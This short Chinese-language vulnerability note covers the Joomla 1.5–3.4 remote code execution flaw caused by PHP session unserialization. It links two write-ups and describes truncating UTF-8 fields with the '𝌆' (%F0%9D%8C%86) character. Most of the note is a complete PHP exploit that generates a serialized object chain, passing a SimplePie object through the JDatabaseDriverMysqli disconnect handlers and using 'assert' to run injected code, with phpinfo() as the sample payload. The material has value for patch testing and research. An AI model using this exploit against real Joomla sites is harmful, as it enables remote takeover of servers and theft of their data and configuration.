# Joomla远程代码执行漏洞
## 影响范围
* `Joomla 1.5 to 3.4 all version`
## 分析
* [https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html](https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html)
* PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患[https://github.com/80vul/phpcodz/blob/master/research/pch-013.md](https://github.com/80vul/phpcodz/blob/master/research/pch-013.md)
* `利用'𝌆'(%F0%9D%8C%86)字符将utf-8的字段截断.`
## EXP
```php
<?php
//header("Content-Type: text/plain");
class JSimplepieFactory {
}
class JDatabaseDriverMysql {

}
class SimplePie {
    var $sanitize;
    var $cache;
    var $cache_name_function;
    var $javascript;
    var $feed_url;
    function __construct()
    {
        $this->feed_url = "phpinfo();JFactory::getConfig();exit;";
        $this->javascript = 9999;
        $this->cache_name_function = "assert";
        $this->sanitize = new JDatabaseDriverMysql();
        $this->cache = true;
    }
}

class JDatabaseDriverMysqli {
    protected $a;
    protected $disconnectHandlers;
    protected $connection;
    function __construct()
    {
        $this->a = new JSimplepieFactory();
        $x = new SimplePie();
        $this->connection = 1;
        $this->disconnectHandlers = [
            [$x, "init"],
        ];
    }
}

$a = new JDatabaseDriverMysqli();
echo serialize($a); 
```
## POC
由上述代码生成
